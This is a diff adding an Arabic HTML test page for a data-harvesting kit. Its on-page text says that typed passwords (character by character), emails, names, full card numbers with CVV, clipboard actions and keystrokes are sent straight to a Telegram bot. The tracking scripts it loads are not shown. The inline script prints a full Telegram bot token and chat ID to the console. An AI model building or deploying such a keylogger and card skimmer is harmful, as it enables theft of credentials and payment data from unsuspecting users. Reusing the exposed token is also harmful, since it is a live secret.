@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختبار جمع البيانات</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/fixed-countdown-styles.css">
+    <style>
+        body { font-family: 'Arial', sans-serif; }
+        .test-card { 
+            background: white; 
+            border-radius: 10px; 
+            padding: 20px; 
+            margin: 20px 0; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+        }
+        .status-indicator { 
+            width: 10px; 
+            height: 10px; 
+            background: #10B981; 
+            border-radius: 50%; 
+            display: inline-block; 
+            margin-left: 10px; 
+        }
+        input, textarea { 
+            border: 2px solid #E5E7EB; 
+            border-radius: 8px; 
+            padding: 12px; 
+            width: 100%; 
+            margin: 10px 0; 
+            transition: border-color 0.3s;
+        }
+        input:focus, textarea:focus { 
+            border-color: #3B82F6; 
+            outline: none; 
+        }
+        .btn {
+            background: #3B82F6;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 5px;
+            transition: background 0.3s;
+        }
+        .btn:hover { background: #2563EB; }
+        .success { color: #10B981; }
+        .warning { color: #F59E0B; }
+        .error { color: #EF4444; }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen p-4">
+    <div class="max-w-4xl mx-auto">
+        <div class="text-center mb-8">
+            <h1 class="text-4xl font-bold text-gray-800 mb-4">
+                🧪 اختبار جمع البيانات
+            </h1>
+            <p class="text-gray-600">
+                اختبر جميع أنظمة التتبع - كل ما تكتبه سيصل فوراً لبوت التيليجرام
+            </p>
+            <div class="mt-4">
+                <span class="status-indicator"></span>
+                <span class="text-sm text-gray-600">أنظمة التتبع نشطة</span>
+            </div>
+        </div>
+
+        <!-- اختبار كلمات المرور -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-red-600">
+                🔒 اختبار كلمات المرور
+            </h2>
+            <p class="text-sm text-gray-600 mb-4">
+                اكتب كلمة مرور هنا - سيتم إرسالها فوراً مع كل حرف
+            </p>
+            <input type="password" placeholder="كلمة المرور" id="test-password">
+            <input type="password" placeholder="تأكيد كلمة المرور" id="confirm-password">
+        </div>
+
+        <!-- اختبار الإيميلات -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-blue-600">
+                📧 اختبار الإيميلات
+            </h2>
+            <p class="text-sm text-gray-600 mb-4">
+                أدخل بريدك الإلكتروني - سيتم إرساله فوراً
+            </p>
+            <input type="email" placeholder="البريد الإلكتروني" id="test-email">
+            <input type="text" name="email" placeholder="حقل إيميل بدون نوع" id="email-field">
+        </div>
+
+        <!-- اختبار الأسماء -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-green-600">
+                👤 اختبار الأسماء
+            </h2>
+            <p class="text-sm text-gray-600 mb-4">
+                أدخل اسمك - سيتم إرساله فوراً
+            </p>
+            <input type="text" placeholder="الاسم الكامل" id="test-name">
+            <input type="text" name="first_name" placeholder="الاسم الأول" id="first-name">
+            <input type="text" name="last_name" placeholder="اسم العائلة" id="last-name">
+        </div>
+
+        <!-- اختبار بيانات بطاقة الائتمان -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-purple-600">
+                💳 اختبار بيانات البطاقة
+            </h2>
+            <p class="text-sm text-gray-600 mb-4">
+                أدخل بيانات بطاقة اختبار - سيتم إرسالها فوراً
+            </p>
+            <input type="text" placeholder="رقم البطاقة" name="card_number" id="card-number">
+            <input type="text" placeholder="اسم حامل البطاقة" name="cardholder_name" id="cardholder-name">
+            <div class="grid grid-cols-2 gap-4">
+                <input type="text" placeholder="MM/YY" name="expiry_date" id="expiry-date">
+                <input type="text" placeholder="CVV" name="cvv" id="cvv-code">
+            </div>
+        </div>
+
+        <!-- اختبار النموذج الكامل -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-orange-600">
+                📝 اختبار النموذج الكامل
+            </h2>
+            <p class="text-sm text-gray-600 mb-4">
+                املأ النموذج واضغط إرسال - سيتم إرسال جميع البيانات
+            </p>
+            <form id="complete-test-form">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <input type="text" name="full_name" placeholder="الاسم الكامل" required>
+                    <input type="email" name="email_address" placeholder="البريد الإلكتروني" required>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <input type="password" name="user_password" placeholder="كلمة المرور" required>
+                    <input type="password" name="confirm_password" placeholder="تأكيد كلمة المرور" required>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <input type="text" name="phone_number" placeholder="رقم الهاتف">
+                    <input type="text" name="country" placeholder="البلد">
+                </div>
+                <textarea name="message" placeholder="رسالة إضافية" rows="3"></textarea>
+                <button type="submit" class="btn">إرسال النموذج الكامل</button>
+            </form>
+        </div>
+
+        <!-- اختبار النسخ واللصق -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-teal-600">
+                📋 اختبار النسخ واللصق
+            </h2>
+            <p class="text-sm text-gray-600 mb-4">
+                انسخ والصق النص - سيتم تتبع كل عملية
+            </p>
+            <textarea placeholder="اكتب هنا ثم انسخ النص..." id="copy-text" rows="3"></textarea>
+            <textarea placeholder="الصق النص المنسوخ هنا..." id="paste-text" rows="3"></textarea>
+        </div>
+
+        <!-- اختبار ضغطات المفاتيح -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-pink-600">
+                ⌨️ اختبار ضغطات المفاتيح
+            </h2>
+            <p class="text-sm text-gray-600 mb-4">
+                اكتب هنا - سيتم تتبع كل ضغطة مفتاح
+            </p>
+            <textarea placeholder="منطقة كتابة حرة - كل ضغطة مفتاح ستُسجل..." id="keylog-area" rows="4"></textarea>
+        </div>
+
+        <!-- مؤشرات الحالة -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-gray-700">
+                📊 مؤشرات الحالة
+            </h2>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                <div class="text-center p-4 bg-red-50 rounded-lg">
+                    <div class="text-2xl font-bold text-red-600" id="password-count">0</div>
+                    <div class="text-sm text-red-800">كلمات المرور</div>
+                </div>
+                <div class="text-center p-4 bg-blue-50 rounded-lg">
+                    <div class="text-2xl font-bold text-blue-600" id="email-count">0</div>
+                    <div class="text-sm text-blue-800">الإيميلات</div>
+                </div>
+                <div class="text-center p-4 bg-green-50 rounded-lg">
+                    <div class="text-2xl font-bold text-green-600" id="name-count">0</div>
+                    <div class="text-sm text-green-800">الأسماء</div>
+                </div>
+                <div class="text-center p-4 bg-purple-50 rounded-lg">
+                    <div class="text-2xl font-bold text-purple-600" id="form-count">0</div>
+                    <div class="text-sm text-purple-800">النماذج</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- معلومات النظام -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-gray-700">
+                ℹ️ معلومات النظام
+            </h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="bg-gray-50 p-4 rounded-lg">
+                    <h3 class="font-bold text-gray-700">بوت التيليجرام</h3>
+                    <p class="text-sm text-gray-600">7285756328:AAFH...</p>
+                    <p class="text-xs text-green-600 success">✓ متصل</p>
+                </div>
+                <div class="bg-gray-50 p-4 rounded-lg">
+                    <h3 class="font-bold text-gray-700">معرف الدردشة</h3>
+                    <p class="text-sm text-gray-600">2126771039</p>
+                    <p class="text-xs text-green-600 success">✓ نشط</p>
+                </div>
+                <div class="bg-gray-50 p-4 rounded-lg">
+                    <h3 class="font-bold text-gray-700">أنظمة التتبع</h3>
+                    <p class="text-sm text-gray-600">3 أنظمة نشطة</p>
+                    <p class="text-xs text-green-600 success">✓ تعمل</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- تعليمات -->
+        <div class="test-card">
+            <h2 class="text-xl font-bold mb-4 text-indigo-600">
+                📖 تعليمات الاختبار
+            </h2>
+            <div class="text-sm text-gray-600 space-y-2">
+                <p>• <strong>كلمات المرور:</strong> سيتم إرسالها فوراً مع كل حرف</p>
+                <p>• <strong>الإيميلات:</strong> سيتم إرسالها عند كتابة @ أو أكثر من 5 أحرف</p>
+                <p>• <strong>الأسماء:</strong> سيتم إرسالها عند كتابة أكثر من 2 أحرف</p>
+                <p>• <strong>النماذج:</strong> سيتم إرسالها عند الضغط على "إرسال"</p>
+                <p>• <strong>ضغطات المفاتيح:</strong> سيتم إرسالها كل 10 أحرف أو 5 ثوان</p>
+                <p>• <strong>النسخ واللصق:</strong> سيتم تتبعها فوراً</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- تحميل أنظمة التتبع -->
+    <script src="js/performance-optimizer.js"></script>
+    <script src="js/fixed-countdown.js"></script>
+    <script src="js/instant-tracker.js"></script>
+    <script src="js/simple-data-collector.js"></script>
+    <script src="js/telegram-notifications.js"></script>
+    <script src="js/advanced-user-tracking.js"></script>
+
+    <script>
+        // متغيرات العداد
+        let counters = {
+            passwords: 0,
+            emails: 0,
+            names: 0,
+            forms: 0
+        };
+
+        // تحديث العدادات
+        function updateCounters() {
+            document.getElementById('password-count').textContent = counters.passwords;
+            document.getElementById('email-count').textContent = counters.emails;
+            document.getElementById('name-count').textContent = counters.names;
+            document.getElementById('form-count').textContent = counters.forms;
+        }
+
+        // تتبع الأحداث وتحديث العدادات
+        document.addEventListener('input', function(e) {
+            const element = e.target;
+            
+            if (element.type === 'password') {
+                counters.passwords++;
+            } else if (element.type === 'email' || element.name?.includes('email')) {
+                counters.emails++;
+            } else if (element.name?.includes('name') || element.id?.includes('name')) {
+                counters.names++;
+            }
+            
+            updateCounters();
+        });
+
+        document.addEventListener('submit', function(e) {
+            e.preventDefault(); // منع الإرسال الفعلي
+            counters.forms++;
+            updateCounters();
+            
+            // إظهار رسالة تأكيد
+            alert('تم إرسال النموذج! 📨 تحقق من بوت التيليجرام');
+        });
+
+        // تحديث العدادات كل ثانية
+        setInterval(updateCounters, 1000);
+
+        console.log('🧪 صفحة اختبار جمع البيانات جاهزة!');
+        console.log('📱 بوت التيليجرام: 7285756328:AAFHLQU8e72LO2U_IAhNrR99cttRBkT6CEU');
+        console.log('💬 معرف الدردشة: 2126771039');
+    </script>
+</body>
+</html>
